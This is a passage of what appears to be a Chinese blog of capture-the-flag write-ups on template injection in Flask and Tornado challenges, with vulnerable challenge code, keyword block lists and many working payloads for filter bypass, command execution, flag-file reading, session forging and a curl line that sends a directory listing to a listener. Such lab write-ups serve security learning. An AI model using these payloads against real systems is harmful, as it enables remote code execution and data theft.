&#39;s_e_c_r_e_t_k_e_y&#39;bootstrap = Bootstrap(app) class NameForm(FlaskForm):    text = StringField(&#39;BASE64加密&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;提交&#39;)class NameForm1(FlaskForm):    text = StringField(&#39;BASE64解密&#39;,validators= [DataRequired()])    submit = SubmitField(&#39;提交&#39;) def waf(str):    black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;,                  &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]    for x in black_list :        if x in str.lower() :            return 1  @app.route(&#39;/hint&#39;,methods=[&#39;GET&#39;])def hint():    txt = &quot;失败乃成功之母！！&quot;    return render_template(&quot;hint.html&quot;,txt = txt)  @app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def encode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64encode(text.encode())        tmp = &quot;结果  :&#123;0&#125;&quot;.format(str(text_decode.decode()))        res =  render_template_string(tmp)        flash(tmp)        return redirect(url_for(&#39;encode&#39;))     else :        text = &quot;&quot;        form = NameForm(text)        return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;) @app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def decode():    if request.values.get(&#39;text&#39;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#39;decode&#39;))        res =  render_template_string(tmp)        flash( res )        return redirect(url_for(&#39;decode&#39;))     else :        text = &quot;&quot;        form = NameForm1(text)        return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)  @app.route(&#39;/&lt;name&gt;&#39;,methods=[&#39;GET&#39;])def not_found(name):    return render_template(&quot;404.html&quot;,name = name) if __name__ == &#39;__main__&#39;:    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)</code></pre><pre><code class="python"> def waf(str): black_list = [&quot;flag&quot;, &quot;os&quot;,        &quot;system&quot;, &quot;popen&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;chr&quot;, &quot;request&quot;,        &quot;subprocess&quot;, &quot;commands&quot;, &quot;socket&quot;, &quot;hex&quot;, &quot;base64&quot;, &quot;*&quot;, &quot;?&quot;]</code></pre><p>我们发现waf过滤了这些关键词，我们要进行绕过</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152148066.png" alt="image-20220221152148066"></p><p>读取下flag</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_f'+'lag.txt', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220221152432736.png" alt="image-20220221152432736"></p><p>读取使用切片省去了拼接flag的步骤</p><pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==‘catch_warnings‘ %&#125;&#123;&#123; c.__init__.__globals__[‘__builtins__‘].open(‘txt.galf_eht_si_siht/‘[::-1],‘r‘).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h3 id="pasecactf-2019-flask-ssti-编码绕过"><a href="#pasecactf-2019-flask-ssti-编码绕过" class="headerlink" title="[pasecactf_2019]flask_ssti 编码绕过"></a>[pasecactf_2019]flask_ssti 编码绕过</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130128195.png" alt="image-20220223130128195"></p><p>存在模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130221897.png" alt="image-20220223130221897"></p><p>列举子类被禁止</p><p>经过测试，发现是 __   .    ‘  被过滤</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130556622.png" alt="image-20220223130556622"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130610494.png" alt="image-20220223130610494"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223130822136.png" alt="image-20220223130822136"></p><p>转16进制绕过</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223221456791.png" alt="image-20220223221456791"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223222201394.png" alt="image-20220223222201394"></p><p>exp </p><pre><code class="python">&#123;&#123;""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("whoami")["read"]()&#125;&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220223224419318.png" alt="image-20220223224419318"></p><p>解法一:</p><p>读取app.py源码,发现:</p><pre><code class="python">def encode(line, key, key2): return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;) </code></pre><p>读取config，flag值为</p><pre><code>&#39;-M7\x10w\x12d9cT#`&#125;\x0e\x1e\x0fiS(D\x1e\x13X\x17&#123;n\x03g\x02\t\x10[#\x07/(Ak\x15^NG&#39;&#125;&gt; </code></pre><p>解密脚本:</p><pre><code class="python">key=&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;key2=&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;flag_encoded=&#39;这里放加密后的flag&#39;flag=&#39;&#39;for x in range(len(flag_encoded)):    for i in range(33,127):        if flag_encoded[x]==chr(x ^ i ^ ord(key[::-1][x]) ^ ord(key2[x])):            flag+=chr(i)            print(flag)</code></pre><p>解法二:</p><p><code>/proc/self</code>表示当前进程目录</p><p>获取当前进程打开的文件内容:cat /proc/self/fd/{id}</p><p><strong>注意：</strong>在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的。因为如果 cat读取/proc/self/cmdline/的话，得到的是 cat进程的信息。所以我们要通过题目的当前进程使用读取文件（比如，文件包含漏洞，，SSTI，，file:\\本地读取，，../../../目录穿越，，SSRF）的方式读取/proc/self/cmdline</p><pre><code>&#123;&#123;()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")&#125;&#125;</code></pre><h3 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226141959161.png" alt="image-20220226141959161"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226142008734.png" alt="image-20220226142008734"></p><p>测了一下，给了个php的报错</p><p>这里其实给了一个编出来的PHP假报错（害人）</p><p><code>&#123;&#123;...&#125;&#125;</code>装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。<br><code>&#123;% ... %&#125;</code>：装载一个控制语句。<br><code>&#123;# ... #&#125;</code>：装载一个注释，模板渲染的时候会忽视这中间的值。</p><p>双大括号这种表示方式就是可以直接回显在页面上的，而这种方式被过滤了，那我们就使用<code>&#123;% ... %&#125;</code>语句</p><p><code>&#123;% %&#125;</code>可以配合<code>if()</code>或者<code>print()</code>函数进行输出</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226143333684.png" alt="image-20220226143333684"></p><p>成功回显</p><p>lipsum是一个方法</p><p>该方法常用payload</p><pre><code class="python">&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></pre><pre><code class="python">&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('whoami').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145434182.png" alt="image-20220226145434182"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145458311.png" alt="image-20220226145458311"></p><pre><code class="python">name=&#123;%print lipsum.__globals__['__bui'+'ltins__']['__im'+'port__']('o'+'s')['po'+'pen']('cat /flag_1s_Hera').read()%&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226145533225.png" alt="image-20220226145533225"></p><p>第二种方法</p><p>源码如下:</p><pre><code class="python">blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;];for no in blacklist:    while True:        if no in s:            s = s.replace(no, &#39;&#39;)        else:            breakreturn s</code></pre><p>先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因此这里用双写是无法绕过的，但是这种过滤的逻辑是错误的，如下这种构造是无法被过滤的：</p><pre><code class="python">&#123;%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__('oconfigs').poconfigpen('whoami').read()%&#125;</code></pre><p>因为<code>config</code>字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行<code>config</code>的过滤，但是过滤完<code>config</code>之后才会出现黑名单中前面的字符串，因此可以绕过。</p><p>第三种方法，不用print，使用curl外带</p><pre><code class="python">&#123;% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://127.0.0.1:2333/ -d `ls /|base64`') %&#125;1&#123;% endiconfigf %&#125;</code></pre><p>vps监听2333端口即可</p><h3 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board"><a href="#CISCN2019-总决赛-Day1-Web3-Flask-Message-Board" class="headerlink" title="[CISCN2019 总决赛 Day1 Web3]Flask Message Board"></a>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h3><p>Fuzz了一波，发现这里无论输入什么都会提示被拒绝，但是<code>Title</code>、<code>Author</code>和<code>Content</code>里面输入<code>1+1</code>就不会，并且回显的是<code>Author</code>的内容。</p><p>那么我们尝试一下，让title和content里的内容为1+1，Author输出我们需要的值</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161218167.png" alt="image-20220226161218167"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161227059.png" alt="image-20220226161227059"></p><p>我们发现了一个好玩的东西</p><pre><code class="html">&#39;SECRET_KEY&#39;: &#39;ill|111|IIlI1lI|I1i|IiliIIli||i1|l||i1il&#39;</code></pre><p>有了这个我们可以来伪造session</p><p>我们抓下包看看</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161500978.png" alt="image-20220226161500978"></p><p>对seesion解密</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161529089.png" alt="image-20220226161529089"></p><p>发现 “admin”:false  猜测要伪造admin</p><p>使用flask-unsign</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145626791.png" alt="image-20220227145626791"></p><p>成功访问/admin</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145809505.png" alt="image-20220227145809505"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145856114.png" alt="image-20220227145856114"></p><p>看一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150134900.png" alt="image-20220227150134900"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150430998.png" alt="image-20220227150430998"></p><p>源码是随机显示一部分，但是好在位置固定，通过脚本复原即可：</p><pre><code class="python">import requestsurl = &#39;http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos&#39;r = requests.get(url)source = r.textfor j in range(10):    r = requests.get(url)    for i in range(len(source)):        if source[i].isspace():            source = source[:i] + r.text[i] + source[i+1:]print(source)</code></pre><p>是和tensorflow有关</p><p>不了解tensorflow，看官方wp：</p><p>通过tensorflow运行下面代码，</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12</code></th><th><code>import tensorflow as tf # Tensorboard可视化 def init(model_path):    new_sess = tf.Session()    meta_file = model_path + &quot;.meta&quot;    model = model_path    saver = tf.train.import_meta_graph(meta_file)    saver.restore(new_sess, model)    return new_sess sess = init(&#39;detection_model/detection&#39;) writer = tf.summary.FileWriter(&quot;./log&quot;, sess.graph) # 然后在命令行执行tensorboard --logdir ./log </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>在对应端口查看图结构，发现当输入的字符串字符总和为1024时会触发读取<code>/flag</code>的后门，此时转向处理输入的函数：</p><p>复制</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16</code></th><th><code>def predict(sess, x):    &#39;&#39;&#39;    :param x: input number x        sess: tensorflow session    :return: b&#39;You are: *&#39;    &#39;&#39;&#39;    y = sess.graph.get_tensor_by_name(&quot;y:0&quot;)    y_out = sess.run(y, &#123;&quot;x:0&quot;: x&#125;)    return y_out def check_bot(input_str):    r = predict(sess, sum(map(ord, input_str)))    return r if isinstance(r, str) else r.decode() # check_result = check_bot(content) # check_bot函数只处理了输入框接收的内容，因此只有输入框可以触发读取</code>/flag<code>的后门。 </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>这里<strong>将输入的字符串转化为ASCII码然后求和作为x的值</strong>，需要将x的值改为1024，于是构造一个ASCII码值和为1024的字符串赋值x：</p><blockquote><p>aaaaaabxCZC</p></blockquote><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152804895.png" alt="image-20220227152804895"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152731787.png" alt="image-20220227152731787"></p><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227161912581.png" alt="image-20220227161912581"></p><p>当文件名和filehash不匹配，会报错</p><pre><code class="html">http://f9bce56c-7ea3-4a3e-8c9e-48df6af87351.node4.buuoj.cn:81/error?msg=Error</code></pre><p>猜测msg可控，测试tornado模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162403996.png" alt="image-20220227162403996"></p><p>来了个orz？？</p><p>还是去搜资料吧</p><p>在tornado模板中，存在一些可以访问的快速对象，比如 <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>，这个其实就是handler.settings对象，里面存储着一些环境变量，具体分析请参照《<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162508416.png" alt="image-20220227162508416"></p><p>直接爆出来了cookie_secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162618736.png" alt="image-20220227162618736"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162629687.png" alt="image-20220227162629687"></p><p>可以推算出filehash的值</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163147952.png" alt="image-20220227163147952"></p><h3 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163739351.png" alt="image-20220227163739351"></p><p>里面只有这个，盲猜目录  xxx/secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163835456.png" alt="image-20220227163835456"></p><p>猜测存在参数secret</p><p>随便输入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163930104.png" alt="image-20220227163930104"></p><p>报错，寻找可用信息</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164006319.png" alt="image-20220227164006319"></p><p>发现会对输入的值进行rc4解密</p><p>放一个RC4加密脚本</p><pre><code class="python">import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4加密主函数&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可    # print(&quot;原来的 s 盒：%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;调用加密程序成功。&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))    #print(&quot;加密后的输出(经过编码):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;&quot;)</code></pre><p>可得payload：</p><pre><code class="html">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164255493.png" alt="image-20220227164255493"></p><h3 id="RootersCTF2019-I-lt-3-Flask-用name注入"><a href="#RootersCTF2019-I-lt-3-Flask-用name注入" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask 用name注入"></a>[RootersCTF2019]I_&lt;3_Flask 用name注入</h3><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p>这道题是模板注入。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h5><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110436293.png" alt="image-20220211110436293"></p><h4 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h4><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111724780.png" alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins 